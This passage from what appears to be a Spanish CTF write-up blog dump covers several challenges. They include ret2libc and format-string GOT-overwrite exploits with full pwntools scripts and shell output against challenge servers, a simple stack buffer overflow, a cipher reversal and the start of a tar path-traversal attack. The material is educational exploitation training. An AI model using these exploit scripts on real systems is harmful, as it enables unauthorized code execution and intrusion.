puts (que es la dirección de puts en la GOT).\nVamos a probarlo:\n$ python3 -c 'import os; os.write(1, b\"A\" * 60 + b\"\\x10\\x84\\x04\\x08\" + b\"\\x40\\x86\\x04\\x08\" + b\"\\x18\\xa0\\x04\\x08\")' | ./server Legend: buff MODIFIED padding MODIFIED notsecret MODIFIED secret MODIFIED return address MODIFIED 0xffea27a0 | 00 00 00 00 00 00 00 00 | 0xffea27a8 | 00 00 00 00 00 00 00 00 | 0xffea27b0 | 00 00 00 00 00 00 00 00 | 0xffea27b8 | 00 00 00 00 00 00 00 00 | 0xffea27c0 | ff ff ff ff ff ff ff ff | 0xffea27c8 | ff ff ff ff ff ff ff ff | 0xffea27d0 | 80 75 f1 f7 00 a0 04 08 | 0xffea27d8 | e8 27 ea ff 8b 86 04 08 | Return address: 0x0804868b Input some text: Legend: buff MODIFIED padding MODIFIED notsecret MODIFIED secret MODIFIED return address MODIFIED 0xffea27a0 | 41 41 41 41 41 41 41 41 | 0xffea27a8 | 41 41 41 41 41 41 41 41 | 0xffea27b0 | 41 41 41 41 41 41 41 41 | 0xffea27b8 | 41 41 41 41 41 41 41 41 | 0xffea27c0 | 41 41 41 41 41 41 41 41 | 0xffea27c8 | 41 41 41 41 41 41 41 41 | 0xffea27d0 | 41 41 41 41 41 41 41 41 | 0xffea27d8 | 41 41 41 41 10 84 04 08 | Return address: 0x08048410 0@ Legend: buff MODIFIED padding MODIFIED notsecret MODIFIED secret MODIFIED return address MODIFIED 0xffea2790 | 00 00 00 00 00 00 00 00 | 0xffea2798 | 00 00 00 00 00 00 00 00 | 0xffea27a0 | 00 00 00 00 00 00 00 00 | 0xffea27a8 | 00 00 00 00 00 00 00 00 | 0xffea27b0 | ff ff ff ff ff ff ff ff | 0xffea27b8 | ff ff ff ff ff ff ff ff | 0xffea27c0 | 80 75 f1 f7 00 a0 04 08 | 0xffea27c8 | d8 27 ea ff 8b 86 04 08 | Return address: 0x0804868b Input some text: Legend: buff MODIFIED padding MODIFIED notsecret MODIFIED secret MODIFIED return address MODIFIED 0xffea2790 | 00 00 00 00 00 00 00 00 | 0xffea2798 | 00 00 00 00 00 00 00 00 | 0xffea27a0 | 00 00 00 00 00 00 00 00 | 0xffea27a8 | 00 00 00 00 00 00 00 00 | 0xffea27b0 | ff ff ff ff ff ff ff ff | 0xffea27b8 | ff ff ff ff ff ff ff ff | 0xffea27c0 | 80 75 f1 f7 00 a0 04 08 | 0xffea27c8 | d8 27 ea ff 8b 86 04 08 | Return address: 0x0804868b zsh: done python3 -c | zsh: segmentation fault (core dumped) ./server  Aquí tenemos dos cosas: main se ha llamado dos veces y se ha producido la fuga de memoria (los caracteres 0@\u0026gt; y otros no imprimibles representan la dirección de puts de Glibc en tiempo de ejecución).\nAhora podemos crear un exploit en Python para extraer este valor y más adelante buscar una versión de Glibc:\n#!/usr/bin/env python3 from pwn import * context.binary = 'server' elf = context.binary def main(): p = elf.process() main_addr = 0x8048640 puts_plt_addr = 0x8048410 puts_got_addr = 0x804a018 offset = 60 junk = b'A' * offset payload = junk payload += p32(puts_plt_addr) payload += p32(main_addr) payload += p32(puts_got_addr) p.sendlineafter(b'Input some text: ', payload) p.recvuntil(b'Return address') p.recvline() p.recvline() puts_addr = u32(p.recvline().strip()[:4]) log.info(f'Leaked puts() address: {hex(puts_addr)}') if __name__ == '__main__': main()  Si lo ejecutamos, tenemos la dirección de puts en tiempo de ejecución:\n$ python3 solve.py [*] './server' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) [+] Starting local process './server': pid 1746785 [*] Leaked puts() address: 0xf7e3b290 [*] Switching to interactive mode Legend: buff MODIFIED padding MODIFIED notsecret MODIFIED secret MODIFIED return address MODIFIED 0xff94ee90 | 00 00 00 00 00 00 00 00 | 0xff94ee98 | 00 00 00 00 00 00 00 00 | 0xff94eea0 | 00 00 00 00 00 00 00 00 | 0xff94eea8 | 00 00 00 00 00 00 00 00 | 0xff94eeb0 | ff ff ff ff ff ff ff ff | 0xff94eeb8 | ff ff ff ff ff ff ff ff | 0xff94eec0 | 80 15 fb f7 00 a0 04 08 | 0xff94eec8 | d8 ee 94 ff 8b 86 04 08 | Return address: 0x0804868b Input some text: $  Utilizar context.log_level = 'DEBUG' puede ser útil si se utiliza pwntools porque todos los datos enviados y recibidos se muestran como bytes en hexadecimal.\nPor el momento, vamos a terminar el exploit en local. Ahora que tenemos la dirección real de puts y el programa reiniciado en el main, tenemos otra oportunidad para mandar otro payload. Además, podemos calcular la dirección base de Glibc.\nASLR funciona de tal manera que solamente se genera una dirección base aleatoria, y las direcciones de las funciones se calculan utilizando offsets. Podemos obtener el offset de puts en la librería Glibc local:\n$ ldd server linux-gate.so.1 (0xf7f41000) libc.so.6 = /lib32/libc.so.6 (0xf7d3f000) /lib/ld-linux.so.2 (0xf7f43000) $ readelf -s /lib32/libc.so.6 | grep puts 215: 00071290 531 FUNC GLOBAL DEFAULT 16 _IO_puts@@GLIBC_2.0 461: 00071290 531 FUNC WEAK DEFAULT 16 puts@@GLIBC_2.0 540: 0010c050 1240 FUNC GLOBAL DEFAULT 16 putspent@@GLIBC_2.0 737: 0010dc90 742 FUNC GLOBAL DEFAULT 16 putsgent@@GLIBC_2.10 1244: 0006fa20 381 FUNC WEAK DEFAULT 16 fputs@@GLIBC_2.0 1831: 0006fa20 381 FUNC GLOBAL DEFAULT 16 _IO_fputs@@GLIBC_2.0 2507: 0007ac20 191 FUNC WEAK DEFAULT 16 fputs_unlocked@@GLIBC_2.1  El offset de puts es 0x71290. Nótese que los tres últimos dígitos del offset coinciden con los tres últimos dígitos de la dirección real de puts en tiempo de ejecución. Esto ocurre porque ASLR genera direcciones que terminan en 000 en hexadecimal. Esto también sirve como validación de que todo está funcionando correctamente.\nPodemos calcular la dirección base de Glibc en tiempo de ejecución con una resta. Y después, podremos calcular las direcciones reales de system y del puntero a \u0026quot;/bin/sh\u0026quot;. Estos son los offsets:\n$ readelf -s /lib32/libc.so.6 | grep system 258: 00137810 106 FUNC GLOBAL DEFAULT 16 svcerr_systemerr@@GLIBC_2.0 662: 00045420 63 FUNC GLOBAL DEFAULT 16 __libc_system@@GLIBC_PRIVATE 1534: 00045420 63 FUNC WEAK DEFAULT 16 system@@GLIBC_2.0 $ strings -atx /lib32/libc.so.6 | grep /bin/sh 18f352 /bin/sh  Ahora podemos calcular las direcciones reales y enviar el segundo payload, para llamar a system con el puntero a \u0026quot;/bin/sh\u0026quot; como argumento:\n#!/usr/bin/env python3 from pwn import * context.binary = 'server' elf = context.binary def main(): p = elf.process() main_addr = 0x8048640 puts_plt_addr = 0x8048410 puts_got_addr = 0x804a018 offset = 60 junk = b'A' * offset payload = junk payload += p32(puts_plt_addr) payload += p32(main_addr) payload += p32(puts_got_addr) p.sendlineafter(b'Input some text: ', payload) p.recvuntil(b'Return address') p.recvline() p.recvline() puts_addr = u32(p.recvline().strip()[:4]) log.info(f'Leaked puts() address: {hex(puts_addr)}') puts_offset = 0x071290 system_offset = 0x045420 bin_sh_offset = 0x18f352 glibc_base_addr = puts_addr - puts_offset log.info(f'Glibc base address: {hex(glibc_base_addr)}') system_addr = glibc_base_addr + system_offset bin_sh_addr = glibc_base_addr + bin_sh_offset payload = junk payload += p32(system_addr) payload += p32(0) payload += p32(bin_sh_addr) p.sendlineafter(b'Input some text: ', payload) p.recv() p.interactive() if __name__ == '__main__': main()  $ python3 solve.py [*] './server' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) [+] Starting local process './server': pid 1758891 [*] Leaked puts() address: 0xf7dd1290 [*] Glibc base address: 0xf7d60000 [*] Switching to interactive mode $ ls server solve.py  Perfecto, ahora podemos cambiar process por remote y lanzar el exploit contra la instancia remota:\n$ python3 solve.py thekidofarcrania.com 4902 [*] './server' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) [+] Opening connection to thekidofarcrania.com on port 4902: Done [*] Leaked puts() address: 0xf7e17b40 [*] Glibc base address: 0xf7da68b0 [*] Switching to interactive mode Legend: buff MODIFIED padding MODIFIED notsecret MODIFIED secret MODIFIED return address MODIFIED 0xffe12f10 | 41 41 41 41 41 41 41 41 | 0xffe12f18 | 41 41 41 41 41 41 41 41 | 0xffe12f20 | 41 41 41 41 41 41 41 41 | 0xffe12f28 | 41 41 41 41 41 41 41 41 | 0xffe12f30 | 41 41 41 41 41 41 41 41 | 0xffe12f38 | 41 41 41 41 41 41 41 41 | 0xffe12f40 | 41 41 41 41 41 41 41 41 | 0xffe12f48 | 41 41 41 41 d0 bc de f7 | Return address: 0xf7debcd0 timeout: the monitored command dumped core [*] Got EOF while reading in interactive $  Y no funciona. Esto se debe a que el servidor está utilizando una versión de Glibc diferente. Nótese que los tres últimos dígitos en hexadecimal de la dirección de puts son diferentes, y por tanto, la dirección base de Glibc no termina en 000.\nSin embargo, podemos buscar una versión de Glibc que tenga puts con un offset que termine en b40, que es el que tiene la instancia remota. Una base de datos de Glibc útil es libc.blukat.me:\nDesde aquí podemos descargar la librería o tomar nota de los offsets que necesitamos (puts, system y \u0026quot;/bin/sh\u0026quot;). Tenemos que corregir los offsets entonces:\nputs_offset = 0x067b40 # 0x071290 system_offset = 0x03d200 # 0x045420 bin_sh_offset = 0x17e0cf # 0x18f352  Y ahora lanzamos el exploit y obtenemos una consola de comandos con la que podemos leer la flag:\n$ python3 solve.py thekidofarcrania.com 4902 [*] './server' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) [+] Opening connection to thekidofarcrania.com on port 4902: Done [*] Leaked puts() address: 0xf7d7db40 [*] Glibc base address: 0xf7d16000 [*] Switching to interactive mode $ cat /flag2.txt CTFlearn{c0ngrat1s_0n_th1s_sh3ll!_SKDJLSejf}  Existe una manera mucho más simple de obtener una consola de comandos. De hecho, el reto dice que no es necesario utilizar Glibc. Y en efecto, podemos aprovecharnos de la ayuda que proporciona el programa para explotar la vulnerabilidad de Buffer Overflow como en RIP my bof.\nLa clave es que el programa está fugando direcciones de la pila (stack), por lo que podemos escribir \u0026quot;/bin/sh\u0026quot; y conocer la dirección de memoria que apunta a la cadena. Otro punto importante es que la función system se puede llamar directamente desde la PLT, ya que está presente en el código fuente.\nPor tanto, solamente necesitamos llamar a system en la PLT y añadir la dirección de la pila donde guardaremos la cadena \u0026quot;/bin/sh\u0026quot;.\nPodemos tomar una dirección de la pila de la salida del programa, por ejemplo la primera. La idea es sobrescribir $eip con la dirección de system en la PLT, luego, los 4 bytes siguientes serán la dirección de retorno (que dan igual, pueden ser bytes nulos), y los 4 bytes siguientes son el puntero a \u0026quot;/bin/sh\u0026quot;. La mejor idea es poner \u0026quot;/bin/sh\u0026quot; justo después del puntero y calcular su dirección para ponerla en la posición correcta.\nGDB puede venir bien para chequear que todo está en su sitio.\nEs posible que todo esto se entienda mejor con el siguiente exploit en Python, que es más corto que el anterior:\n#!/usr/bin/env python3 from pwn import context, log, p32, remote, sys context.binary = 'server' elf = context.binary def get_process(): if len(sys.argv) == 1: return elf.process() host, port = sys.argv[1], int(sys.argv[2]) return remote(host, port) def main(): p = get_process() p.recvuntil(b'address') p.recvline() stack_addr = int(p.recvline().split()[0].decode(), 16) log.info(f'Leaked an address on the stack: {hex(stack_addr)}') offset = 60 junk = b'A' * offset payload = junk payload += p32(elf.plt.system) payload += p32(0) payload += p32(stack_addr + 0x48) payload += b'/bin/sh' p.sendlineafter(b'Input some text: ', payload) p.recvuntil(b'Return') p.recv() p.interactive() if __name__ == '__main__': main()  Y funciona tanto en local como en remoto, sin necesidad de utilizar Glibc:\n$ python3 solve2.py [*] './server' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) [+] Opening connection to thekidofarcrania.com on port 4902: Done [*] Leaked an address on the stack: 0xff9bac40 [*] Switching to interactive mode $ ls server solve2.py solve.py  $ python3 solve2.py thekidofarcrania.com 4902 [*] './server' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) [+] Opening connection to thekidofarcrania.com on port 4902: Done [*] Leaked an address on the stack: 0xffd57510 [*] Switching to interactive mode $ cat /flag2.txt CTFlearn{c0ngrat1s_0n_th1s_sh3ll!_SKDJLSejf}  Los exploits completos se pueden encontrar aquí: solve.py y solve2.py.\n","image":"/images/pwn.png","permalink":"https://7rocky.github.io/ctf/ctflearn/binary/shell-time/","section":"ctf","summary":"Binario de 32 bits. Buffer Overflow. Ret2Libc","time":10,"title":"Shell time!"},{"contents":"Se nos proporciona este código fuente en Python:\nimportstring importrandom flag=open(\"flag.txt\").read().strip() mystery_num=random.randint(100,1000) new_alphabet=list(string.ascii_lowercase+string.digits+string.punctuation) enc_flag=\"\" defshift(char): index=new_alphabet.index(char) new_index=(index+mystery_num) %len(new_alphabet) returnnew_alphabet[new_index] forcharinflag: enc_flag+=shift(char) mystery_num+=10 print(enc_flag) # 15[=\u0026gt;ts-!]kgjhz%6cn~\";=;.1b3:\u0026gt;}sq7n'\\^]42t  Lo que hace el script es crear un alfabeto y un número aleatorio (mystery_num). Luego, para cifrar la flag, encuentra el índice del carácter en texto claro correspondiente, le suma el número aleatorio (módulo la longitud del alfabeto) y devuelve el carácter en ese nuevo índice.\nComo sabemos el formato de las flags (ictf{...}), podemos encontrar el valor del número aleatorio módulo la longitud del alfabeto:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; import string \u0026gt;\u0026gt;\u0026gt; new_alphabet = list(string.ascii_lowercase + string.digits + string.punctuation) \u0026gt;\u0026gt;\u0026gt; enc_flag = '''15[=\u0026gt;ts-!]kgjhz%6cn~\";=;.1b3:\u0026gt;}sq7n'\\^]42t''' \u0026gt;\u0026gt;\u0026gt; index = new_alphabet.index('i') \u0026gt;\u0026gt;\u0026gt; new_index = new_alphabet.index(enc_flag[0]) \u0026gt;\u0026gt;\u0026gt; mystery_num = (new_index - index) % len(new_alphabet) \u0026gt;\u0026gt;\u0026gt; mystery_num 19  Nótese que no nos importa que mystery_num no sea el valor aleatorio real (que está entre 100 y 1000), ya que se aplica módulo la longitud del alfabeto.\nAhora podemos definir la función inversa de shift (unshift) y obtener la flag:\n\u0026gt;\u0026gt;\u0026gt; def unshift(char): ... new_index = new_alphabet.index(char) ... index = (new_index - mystery_num) % len(new_alphabet) ... return new_alphabet[index] ... \u0026gt;\u0026gt;\u0026gt; flag = '' \u0026gt;\u0026gt;\u0026gt; for char in enc_flag: ... flag += unshift(char) ... mystery_num += 10 ... \u0026gt;\u0026gt;\u0026gt; flag 'ictf{sh1ft1ng_ch@rs_w1th_4_myst3ry_numb3r}'  ","image":"/images/reversing.png","permalink":"https://7rocky.github.io/ctf/imaginaryctf/shifted/","section":"ctf","summary":"ImaginaryCTF 03/09/2022. 50 puntos. Aritmética modular. Algoritmo de cifrado inverso","time":0,"title":"Shifted"},{"contents":"Se nos proporciona un binario de 64 bits llamado vuln:\nArch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000)  Si usamos Ghidra para extraer el código en C descompilado, vemos la función main:\nundefined8 main() { longin_FS_OFFSET; charlocal_118[264]; longlocal_10;  local_10 =*(long*) (in_FS_OFFSET +0x28); setvbuf(stdout, (char*) 0x0, 2, 0); setvbuf(stdin, (char*) 0x0, 2, 0); puts(\"Send your string to be printed:\"); fgets(local_118, 256, stdin); printf(local_118); puts(\"As someone wise once said, `sh`\"); puts(\"(i think? not really sure about that one)\"); if(local_10 !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return0; }  Esta función tiene una vulnerabilidad de Format String porque la variable llamada local_118 está bajo nuestro control y se pasa como primer argumento de printf. Por tanto, podemos usar indicadores de format string para fugar valores de la pila (stack) y también escribir valores en direcciones guardadas en la pila.\nTambién hay una función win:\nvoidwin() { system(\"cat flag.txt \u0026gt;/dev/null\"); return; }  Pero es inútil porque la salida de cat flag.txt se redirige a /dev/null. Sin embargo, ya tenemos system enlazado al binario, por lo que no necesitamos burlar ASLR para llamar a system.\nNótese que tenemos un mensaje extraño:\nputs(\"As someone wise once said, `sh`\");  Suponiendo que puts es system, entonces obtendríamos una shell porque \u0026quot;... `sh`\u0026quot; ejecutará sh. Podemos comprobarlo con un simple programa en C:\n$ cat test.c #include \u0026lt;stdlib.h\u0026gt; int main() { system(\"As someone wise once said, `sh`\"); return 0; } $ gcc test.c -o test $ ./test id whoami uname -a ^C $ ./test asdf sh: 1: asdf: not found ^C  No obstante, no se ve la salida del comando, solamente errores. Pero esto es suficiente para la explotación.\nLa estrategia es modificar la Tabla de Offsets Globales (GOT, Global Offset Table) y hacer que puts sea system, de manera que tengamos una shell al ejecutar system(\u0026quot;As someone wise once said, `sh`\u0026quot;). Para explotar la vulnerabilidad de Format String, podemos usar fmtstr_payload de pwntools, que automatiza todo el proceso de escribir bytes en una dirección dada.\nEn primer lugar, vamos a determinar el offset donde se encuentra nuestra format string en la pila:\n$ ./vuln Send your string to be printed: %lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx. 7ffff7fa9a03.0.7ffff7ecafd2.7fffffffe610.0.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.9800000000a.98000000980. As someone wise once said, `sh` (i think? not really sure about that one)  Está en la posición 6. Podemos verificarlo así:\n$ ./vuln Send your string to be printed: AAAABBBB%6$lx AAAABBBB4242424241414141 As someone wise once said, `sh` (i think? not really sure about that one)  Y como se puede ver, %6$lx se reemplaza por 4242424241414141 (que es AAAABBBB en formato hexadecimal format, little-endian). El exploit de Format String abusará del formato %n para escribir valores en direcciones situadas en la pila. Podemos controlar la dirección porque sabemos en qué posición de la pila tenemos que poner la dirección. La manera en la que %n funciona es escribiendo el número de bytes impresos hasta %n en la dirección dada. Y esta es la manera de modificar la GOT y hacer que puts sea system.\nLa GOT es un punto típico de explotación porque contiene las direcciones de las funciones externas usadas por el binario o las direcciones para realizar la resolución si aún no han sido utilizadas.\nY este es el exploit final, muy sencillo gracias a pwntools:\n#!/usr/bin/env python3 frompwnimportcontext, ELF, fmtstr_payload, remote, sys context.binary=elf=ELF('vuln') defget_process(): iflen(sys.argv) ==1: returnelf.process() host, port=sys.argv[1], sys.argv[2] returnremote(host, int(port)) defmain(): p=get_process() payload=fmtstr_payload(6, {elf.got.puts: elf.sym.system}) p.sendlineafter(b'Send your string to be printed:\\n', payload) p.recv() p.interactive() if__name__=='__main__': main()  Y tenemos una shell, pero como antes, no podemos leer de stdout sino de stderr, pero una manera de ver el resultado es con $(...):\n$ python3 solve.py [*] '/home/rocky/Desktop/ImaginaryCTF/Pwn/asdf/vuln' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) [+] Starting local process '/home/rocky/Desktop/ImaginaryCTF/Pwn/asdf/vuln': pid 1200265 [*] Switching to interactive mode $ $(whoami) sh: 1: rocky: not found  Ahora vamos a ver la flag en la instancia remota:\n$ python3 solve.py got.ictf.kctf.cloud 1337 [*] '/home/rocky/Desktop/ImaginaryCTF/Pwn/asdf/vuln' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) [+] Opening connection to got.ictf.kctf.cloud on port 1337: Done [*] Switching to interactive mode $ $(cat flag.txt) sh: 1: ictf{f0rmat_strings_are_so_cool_tysm_rythm_for_introducing_me}: not found  El exploit completo se puede encontrar aquí: solve.py.\n","image":"/images/pwn.png","permalink":"https://7rocky.github.io/ctf/imaginaryctf/show-me-what-you-got/","section":"ctf","summary":"ImaginaryCTF 08/08/2022. 75 puntos. Binario de 64 bits. Vulnerabilidad de Format String. Sobrescritura de la GOT","time":3,"title":"show-me-what-you-got"},{"contents":"Se nos proporciona el código fuente en C de un binario y una instancia remota a la que conectarnos. Básicamente, lo que el programa hace es llamar a gets, que es vulnerable a Buffer Overflow, y luego comparar una variable local con un cierto valor:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; // Defined in a separate source file for simplicity. void init_visualize(char* buff); void visualize(char* buff); void safeguard(); void print_flag(); void vuln() { char padding[16]; char buff[32]; int notsecret = 0xffffff00; int secret = 0xdeadbeef; memset(buff, 0, sizeof(buff)); // Zero-out the buffer. memset(padding, 0xFF, sizeof(padding)); // Zero-out the padding. // Initializes the stack visualization. Don't worry about it! init_visualize(buff); // Prints out the stack before modification visualize(buff); printf(\"Input some text: \"); gets(buff); // This is a vulnerable call! // Prints out the stack after modification visualize(buff); // Check if secret has changed. if (secret == 0x67616c66) { puts(\"You did it! Congratuations!\"); print_flag(); // Print out the flag. You deserve it. return; } else if (notsecret != 0xffffff00) { puts(\"Uhmm... maybe you overflowed too much. Try deleting a few characters.\"); } else if (secret != 0xdeadbeef) { puts(\"Wow you overflowed the secret value! Now try controlling the value of it!\"); } else { puts(\"Maybe you haven't overflowed enough characters? Try again?\"); } exit(0); } int main() { setbuf(stdout, NULL); setbuf(stdin, NULL); safeguard(); vuln(); }  El objetivo del reto es modificar la variable secret de manera que sea igual a 0x67616x66 y entrar en el bloque if, que llama a print_flag.\nSi ejecutamos el programa, nos muestra la pila (stack) para ayudarnos con la explotación:\n$ nc thekidofarcrania.com 35235 Legend: buff MODIFIED padding MODIFIED notsecret MODIFIED secret MODIFIED CORRECT secret 0xffb1c278 | 00 00 00 00 00 00 00 00 | 0xffb1c280 | 00 00 00 00 00 00 00 00 | 0xffb1c288 | 00 00 00 00 00 00 00 00 | 0xffb1c290 | 00 00 00 00 00 00 00 00 | 0xffb1c298 | ff ff ff ff ff ff ff ff | 0xffb1c2a0 | ff ff ff ff ff ff ff ff | 0xffb1c2a8 | ef be ad de 00 ff ff ff | 0xffb1c2b0 | c0 75 ef f7 84 7f 60 56 | 0xffb1c2b8 | c8 c2 b1 ff 11 5b 60 56 | 0xffb1c2c0 | e0 c2 b1 ff 00 00 00 00 | Input some text: AAAA Legend: buff MODIFIED padding MODIFIED notsecret MODIFIED secret MODIFIED CORRECT secret 0xffb1c278 | 41 41 41 41 00 00 00 00 | 0xffb1c280 | 00 00 00 00 00 00 00 00 | 0xffb1c288 | 00 00 00 00 00 00 00 00 | 0xffb1c290 | 00 00 00 00 00 00 00 00 | 0xffb1c298 | ff ff ff ff ff ff ff ff | 0xffb1c2a0 | ff ff ff ff ff ff ff ff | 0xffb1c2a8 | ef be ad de 00 ff ff ff | 0xffb1c2b0 | c0 75 ef f7 84 7f 60 56 | 0xffb1c2b8 | c8 c2 b1 ff 11 5b 60 56 | 0xffb1c2c0 | e0 c2 b1 ff 00 00 00 00 | Maybe you haven't overflowed enough characters? Try again?  Necesitamos añadir más caracteres para llegar a los números en rojo de la pila (es decir, 48 caracteres). Vamos a probar:\n$ python3 -c 'print(\"A\" * 48 + \"B\" * 4)' | nc thekidofarcrania.com 35235 Legend: buff MODIFIED padding MODIFIED notsecret MODIFIED secret MODIFIED CORRECT secret 0xff995cb8 | 00 00 00 00 00 00 00 00 | 0xff995cc0 | 00 00 00 00 00 00 00 00 | 0xff995cc8 | 00 00 00 00 00 00 00 00 | 0xff995cd0 | 00 00 00 00 00 00 00 00 | 0xff995cd8 | ff ff ff ff ff ff ff ff | 0xff995ce0 | ff ff ff ff ff ff ff ff | 0xff995ce8 | ef be ad de 00 ff ff ff | 0xff995cf0 | c0 e5 f3 f7 84 af 5c 56 | 0xff995cf8 | 08 5d 99 ff 11 8b 5c 56 | 0xff995d00 | 20 5d 99 ff 00 00 00 00 | Input some text: Legend: buff MODIFIED padding MODIFIED notsecret MODIFIED secret MODIFIED CORRECT secret 0xff995cb8 | 41 41 41 41 41 41 41 41 | 0xff995cc0 | 41 41 41 41 41 41 41 41 | 0xff995cc8 | 41 41 41 41 41 41 41 41 | 0xff995cd0 | 41 41 41 41 41 41 41 41 | 0xff995cd8 | 41 41 41 41 41 41 41 41 | 0xff995ce0 | 41 41 41 41 41 41 41 41 | 0xff995ce8 | 42 42 42 42 00 ff ff ff | 0xff995cf0 | c0 e5 f3 f7 84 af 5c 56 | 0xff995cf8 | 08 5d 99 ff 11 8b 5c 56 | 0xff995d00 | 20 5d 99 ff 00 00 00 00 | Wow you overflowed the secret value! Now try controlling the value of it!  Genial, tenemos control sobre el valor de secret. Ahora necesitamos sobrescribirlo con 0x67616c66 para poder llamar a print_flag. El número en hexadecimal tiene que ser enviado en formato little-endian (esto es, los bytes en orden inverso: \u0026quot;\\x66\\x6c\\x61\\x67\u0026quot;). Afortunadamente, estos bytes son caracteres ASCII imprimibles que corresponden a la cadena \u0026quot;flag\u0026quot;:\n$ python3 -c 'print(\"\\x66\\x6c\\x61\\x67\")' flag $ python3 -c 'print(\"A\" * 48 + \"flag\")' | nc thekidofarcrania.com 35235 Legend: buff MODIFIED padding MODIFIED notsecret MODIFIED secret MODIFIED CORRECT secret 0xffc59198 | 00 00 00 00 00 00 00 00 | 0xffc591a0 | 00 00 00 00 00 00 00 00 | 0xffc591a8 | 00 00 00 00 00 00 00 00 | 0xffc591b0 | 00 00 00 00 00 00 00 00 | 0xffc591b8 | ff ff ff ff ff ff ff ff | 0xffc591c0 | ff ff ff ff ff ff ff ff | 0xffc591c8 | ef be ad de 00 ff ff ff | 0xffc591d0 | c0 e5 f3 f7 84 af 5c 56 | 0xffc591d8 | 08 5d 99 ff 11 8b 5c 56 | 0xffc591e0 | 20 5d 99 ff 00 00 00 00 | Input some text: Legend: buff MODIFIED padding MODIFIED notsecret MODIFIED secret MODIFIED CORRECT secret 0xffc59198 | 41 41 41 41 41 41 41 41 | 0xffc591a0 | 41 41 41 41 41 41 41 41 | 0xffc591a8 | 41 41 41 41 41 41 41 41 | 0xffc591b0 | 41 41 41 41 41 41 41 41 | 0xffc591b8 | 41 41 41 41 41 41 41 41 | 0xffc591c0 | 41 41 41 41 41 41 41 41 | 0xffc591c8 | 66 6c 61 67 00 ff ff ff | 0xffc591d0 | c0 75 f1 f7 84 7f 5e 56 | 0xffc591d8 | e8 91 c5 ff 11 5b 5e 56 | 0xffc591e0 | 00 92 c5 ff 00 00 00 00 | You did it! Congratuations! CTFlearn{buffer_0verflows_4re_c00l!}  ","image":"/images/pwn.png","permalink":"https://7rocky.github.io/ctf/ctflearn/binary/simple-bof/","section":"ctf","summary":"Binario de 32 bits. Buffer Overflow. Modificación de variables locales","time":5,"title":"Simple bof"},{"contents":"Se nos proporciona un archivo llamado data.dat y nos piden contar las líneas que tienen un número de 0 que es múltiplo de 3 o que tienen un número de 1 que sea múltiplo de 2.\nPodemos echar un vistazo a las primeras líneas del archivo:\n$ head data.dat 0001100000101010100 110101000001111 101100011001110111 0111111010100 1010111111100011 1110011110010110 11100101010110111 10101101011 1111011101001 0001110001  Genial. La idea es iterar el archivo en cada línea y añadir 1 al contador (inicializado a 0) si la condición se cumple.\nEste código en Ruby implementa esta tarea:\n#!/usr/bin/env ruby counter = 0 File.readlines('data.dat').each do |line| counter += 1 if line.count('0') % 3 == 0 or line.count('1') % 2 == 0 end puts \"CTFlearn{#{counter}}\"  $ ruby solve.rb CTFlearn{6662}  También es posible utilizar filter para quitar las líneas que no cumplen la condición, algunos métodos de números, y luego mostrar la longitud del vector resultante:\n#!/usr/bin/env ruby puts \"CTFlearn{#{File.readlines('data.dat').filter do |line| (line.count('0') % 3).zero? or line.count('1').even? end.length}}\"  Los scripts completos se pueden encontrar aquí: solve.rb y solve2.rb.\n","image":"/images/programming.png","permalink":"https://7rocky.github.io/ctf/ctflearn/programming/simple-programming/","section":"ctf","summary":"Contar líneas de un archivo que cumplan una condición","time":0,"title":"Simple Programming"},{"contents":"Tenemos un simple back-end que permite subir un archivo .tar.gz. Como tenemos un archivo Dockerfile, vamos a utilizar un contenedor de Docker en local:\nEn el código fuente vemos que se trata de una aplicación sencilla en Flask (Python):\n@api.route('/unslippy', methods=['POST']) def cache(): if 'file' not in request.files: return abort(400) extraction = extract_from_archive(request.files['file']) if extraction: return {'list': extraction}, 200 return '', 204  El archivo se descomprime y se escribe el /tmp:\nimport tarfile, tempfile, os from application import main generate = lambda x: os.urandom(x).hex() def extract_from_archive(file): tmp = tempfile.gettempdir() path = os.path.join(tmp, file.filename) file.save(path) if tarfile.is_tarfile(path): tar = tarfile.open(path, 'r:gz') tar.extractall(tmp) extractdir = f'{main.app.config[\"UPLOAD_FOLDER\"]}/{generate(15)}' os.makedirs(extractdir, exist_ok=True) extracted_filenames = [] for tarinfo in tar: name = tarinfo.name if tarinfo.isreg(): filename = f'{extractdir}/{name}' os.rename(os.path.join(tmp, name), filename) extracted_filenames.append(filename) continue os.makedirs(f'{extractdir}/{name}', exist_ok=True) tar.close() return extracted_filenames return False  Como el reto se llama Slippy, uno puede pensar en Zip Slip, pero en archivos .tar.gz. Esto consiste en comprimir un archivo que contenga una navegación de directorios, de forma que al extraerlo, se realiza la navegación de directorios y el archivo se guarda en otro directorio.\nVamos a crear la siguiente estructura de directorios:\n$ tree asdf asdf ├── app │ ├── application │ │ └── templates │ │ └── index.html │ └── flag └── asdf └── asdf └── asdf └── firmware.tar.gz 6 directories, 3 files  La idea es ir a asdf/asdf/asdf/asdf y crear un archivo firmware.tar.gz que contenga ../../../app/application/templates/index.html:\n$ tar -czf firmware.tar.gz ../../../app/application/templates/index.html  Esta ruta puede ser descibierta si accedemos al contenedor o si miramos el Dockerfile:\n# Setup app RUN mkdir -p /app # Switch working environment WORKDIR /app # 